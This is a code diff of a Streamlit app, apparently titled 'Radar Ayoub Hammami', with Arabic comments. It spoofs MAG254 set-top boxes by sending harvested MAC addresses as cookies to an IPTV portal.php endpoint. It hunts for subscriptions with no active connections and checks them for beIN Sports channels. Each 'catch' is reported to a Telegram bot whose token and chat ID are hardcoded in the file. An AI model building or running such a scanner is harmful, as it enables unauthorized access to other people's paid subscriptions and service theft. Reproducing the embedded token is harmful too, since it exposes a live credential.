@@ -4,140 +4,110 @@ import time
 import telebot
 import random
 import re
-import pandas as pd
-from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# ============ 🔑 بيانات البوت ============
+# بياناتك الثابتة
 TOKEN = "8485193296:AAHpW18fpS74B3oaUGqNCYZjbodRPa76uLE"
 ID = 7638628794
 bot = telebot.TeleBot(TOKEN)
 
-# ============ 📺 القنوات المستهدفة ============
+# الكلمات المفتاحية للقنوات المطلوبة
 CHANNELS_KEYS = {
     "BEIN AFRICA CUP 2025": ["AFRICA", "2025"],
     "IARI BEIN SPORTS 8K": ["8K", "IARI"],
-    "IARI BEIN SPORTS 4K": ["4K", "IARI"],
+    "IARI BEIN SPORTS 4K": ["4K", "IARI"]
 }
 
-# ============ 🎨 تحسين الواجهة ============
-st.set_page_config(page_title="Radar Pro - STB Checker", layout="wide")
+# إعداد الصفحة مع اسمك
+st.set_page_config(page_title="Radar Ayoub Hammami", page_icon="📡")
+st.markdown(f"<h1 style='text-align: center; color: #FF4B4B;'>📡 Radar Ayoub Hammami</h1>", unsafe_allow_html=True)
+st.markdown(f"<p style='text-align: center; font-weight: bold;'>نظام المسح الذكي للمحترفين</p>", unsafe_allow_html=True)
 
-st.markdown("""
-<style>
-    .main-header { text-align: center; background: linear-gradient(90deg, #1e3a8a 0%, #3b82f6 100%); 
-    padding: 1.5rem; border-radius: 15px; color: white; margin-bottom: 2rem; }
-    .stTextArea textarea { font-family: monospace; }
-</style>
-<div class="main-header">
-    <h1>📡 Radar Pro STB</h1>
-    <p>نظام الفحص المتوازي واصطياد الماكات</p>
-</div>
-""", unsafe_allow_html=True)
+# صندوق إدخال البيانات
+raw_data = st.text_area("انسخ هنا النص العشوائي (روابط وماكات مبعثرة)", height=200)
 
-# وظيفة لتنظيف النص
-def clear_text():
-    st.session_state["input_area"] = ""
-
-# ============ ⚙️ محرك الفحص ============
-def check_mac_logic(host, mac, timeout):
-    try:
-        headers = {
-            'User-Agent': 'MAG254/2.2.0 (Qt; Linux; C) stbapp ver: 2 rev: 250',
-            'Cookie': f'mac={mac}'
-        }
-        base_url = f"http://{host}/portal.php"
+if st.button("🚀 بدء المسح الشامل"):
+    if raw_data:
+        # استخراج الماكات والرابط بذكاء (تجنب التكرار)
+        macs = list(set(re.findall(r'(?:[0-9A-F]{2}[:]){5}[0-9A-F]{2}', raw_data.upper())))
+        host_match = re.search(r'(https?://[^\s/$.?#].[^\s]*)', raw_data)
         
-        # فحص البروفايل
-        start = time.time()
-        r = requests.get(f"{base_url}?type=stb&action=get_profile&force_stb=1", headers=headers, timeout=timeout)
-        latency = (time.time() - start) * 1000
-        
-        if r.status_code == 200:
-            data_text = r.text
-            active = re.search(r'"active_cons"\s*:\s*"(\d+)"', data_text)
-            active_val = int(active.group(1)) if active else 1
+        if host_match and macs:
+            host = host_match.group(0).split('/portal.php')[0].strip('/')
+            clean_host = host.replace("http://", "").replace("https://", "").split('/')[0]
             
-            exp = re.search(r'"end_date"\s*:\s*"([^"]+)"', data_text)
-            exp_val = exp.group(1) if exp else "غير محدد"
+            st.success(f"✅ بورتال: `{clean_host}` | الأهداف المستخرجة: `{len(macs)}`")
             
-            if active_val == 0:
-                # فحص القنوات
-                r_ch = requests.get(f"{base_url}?type=itv&action=get_all_channels", headers=headers, timeout=timeout)
-                ch_text = r_ch.text.upper()
-                found = [n for n, keys in CHANNELS_KEYS.items() if all(k in ch_text for k in keys)]
-                
-                return {
-                    'mac': mac, 'status': 'AVAILABLE', 'latency': f"{int(latency)}ms",
-                    'active': 0, 'expiry': exp_val, 'channels': found
-                }
-            return {'mac': mac, 'status': 'BUSY', 'active': active_val, 'expiry': exp_val}
-    except:
-        pass
-    return {'mac': mac, 'status': 'OFFLINE'}
-
-# ============ 🖥️ واجهة المستخدم ============
-
-# إنشاء صندوق النص باستخدام Session State
-if "input_area" not in st.session_state:
-    st.session_state["input_area"] = ""
-
-input_data = st.text_area("🚀 أدخل البيانات (رابط + ماكات):", 
-                          value=st.session_state["input_area"], 
-                          key="input_area", 
-                          height=200)
-
-col_btns1, col_btns2 = st.columns([3, 1])
-
-with col_btns1:
-    btn_start = st.button("🏁 ابدأ المسح الشامل", type="primary", use_container_width=True)
-
-with col_btns2:
-    btn_clear = st.button("🗑️ تنظيف الحقول", on_click=clear_text, use_container_width=True)
-
-st.divider()
-
-col_cfg1, col_cfg2 = st.columns(2)
-with col_cfg1:
-    threads = st.slider("👥 عدد الخيوط (السرعة)", 1, 30, 15)
-with col_cfg2:
-    timeout_sec = st.slider("⏱️ مهلة الانتظار (ثواني)", 3, 15, 7)
-
-# منطق التشغيل
-if btn_start:
-    if input_data:
-        found_macs = list(set(re.findall(r'(?:[0-9A-F]{2}[:]){5}[0-9A-F]{2}', input_data.upper())))
-        host_match = re.search(r'(https?://[^\s/$.?#].[^\s]*)', input_data)
-        
-        if host_match and found_macs:
-            host = host_match.group(0).split('/portal.php')[0].replace("http://", "").replace("https://", "").strip("/")
-            st.info(f"🌐 جاري العمل على سيرفر: {host} | 🎯 عدد الماكات: {len(found_macs)}")
+            # --- لوحة العدادات المباشرة ---
+            col1, col2, col3 = st.columns(3)
+            stat_total = col1.metric("إجمالي الأهداف", len(macs))
+            stat_checked = col2.empty()
+            stat_found = col3.empty()
             
-            progress = st.progress(0)
-            results = []
+            found_count = 0
+            checked_count = 0
+            
+            # إرسال بداية التشغيل مع اسمك لتلغرام
+            bot.send_message(ID, f"📡 **Radar Ayoub Hammami**\n\n🚀 بدأ الرادار بالتناوب الآن على سيرفر:\n🌐 `{clean_host}`\n📦 عدد الماكات: {len(macs)}")
+
             placeholder = st.empty()
             
-            with ThreadPoolExecutor(max_workers=threads) as executor:
-                futures = {executor.submit(check_mac_logic, host, m, timeout_sec): m for m in found_macs}
-                
-                for i, future in enumerate(as_completed(futures)):
-                    res = future.result()
-                    if res['status'] == 'AVAILABLE':
-                        results.append(res)
-                        # إشعار تلغرام
-                        msg = f"🎯 **صيد جديد**\n🖥️ الماك: `{res['mac']}`\n📅 ينتهي: {res['expiry']}\n📊 الاستقرار: {res['latency']}\n📺 القنوات: {', '.join(res['channels'])}"
-                        bot.send_message(ID, msg, parse_mode="Markdown")
-                        st.success(f"✅ متاح: {res['mac']}")
+            while True:
+                # تصفير عداد الدورة الحالية عند كل بداية جديدة
+                temp_checked = 0
+                for current_mac in macs:
+                    temp_checked += 1
+                    checked_count += 1 # العداد الكلي
                     
-                    progress.progress((i + 1) / len(found_macs))
+                    # تحديث العدادات على الشاشة
+                    stat_checked.metric("إجمالي الفحوصات", checked_count)
+                    stat_found.metric("الصيد الذهبي", found_count)
+                    
+                    placeholder.info(f"🔎 يفحص الآن ({temp_checked}/{len(macs)}): {current_mac}")
+                    
+                    headers = {'User-Agent': 'MAG254', 'Cookie': f'mac={current_mac}'}
+                    base_url = f"http://{clean_host}/portal.php"
+                    
+                    try:
+                        # فحص الحالة والارتباط
+                        url_prof = f"{base_url}?type=stb&action=get_profile&force_stb=1"
+                        start = time.time()
+                        r_prof = requests.get(url_prof, headers=headers, timeout=7)
+                        latency = (time.time() - start) * 1000
+                        
+                        if r_prof.status_code == 200:
+                            match = re.search(r'"active_cons"\s*:\s*"(\d+)"', r_prof.text)
+                            active = match.group(1) if match else "0"
 
-            if results:
-                st.divider()
-                st.subheader("📊 النتائج النهائية")
-                st.dataframe(pd.DataFrame(results), use_container_width=True)
-                st.balloons()
-            else:
-                st.warning("📭 لم يتم العثور على ماكات فارغة في هذه الدورة.")
+                            # إذا وجدنا ماك فارغ (0 متصل)
+                            if active == "0":
+                                found_count += 1
+                                # فحص القنوات المفضلة
+                                url_ch = f"{base_url}?type=itv&action=get_all_channels"
+                                r_ch = requests.get(url_ch, headers=headers, timeout=7)
+                                ch_text = r_ch.text.upper()
+                                
+                                found_channels = [f"✅ {n}" for n, k in CHANNELS_KEYS.items() if all(x in ch_text for x in k)]
+                                stab = "قوي ✅" if latency < 1000 else "متقطع ⚠️"
+                                
+                                # تنبيه التلغرام مع توقيعك
+                                alert = (
+                                    f"🎯 **صيد متاح بواسطة Radar Ayoub**\n\n"
+                                    f"🖥️ الماك: `{current_mac}`\n"
+                                    f"📊 الاستقرار: {stab}\n"
+                                    f"👥 المتصلون: `0`\n"
+                                    f"📺 القنوات:\n" + ("\n".join(found_channels) if found_channels else "❌ القنوات المفضلة غير متاحة") +
+                                    f"\n\n👤 المالك: Ayoub Hammami"
+                                )
+                                bot.send_message(ID, alert, parse_mode="Markdown")
+                                st.balloons() # احتفال بسيط عند الصيد
+                    except:
+                        pass
+                    
+                    time.sleep(1.2) # سرعة الفحص مع حماية من الحظر
+
+                placeholder.warning("🔄 انتهت الدورة.. إعادة المسح التلقائي...")
+                time.sleep(10)
         else:
-            st.error("❌ تأكد من إدخال رابط صحيح وقائمة ماكات.")
+            st.error("❌ عذراً أيوب، لم أجد رابط سيرفر أو ماكات صالحة في النص.")
     else:
-        st.warning("⚠️ الرجاء إدخال البيانات أولاً.")
+        st.warning("⚠️ الصندوق فارغ! ضع البيانات أولاً.")
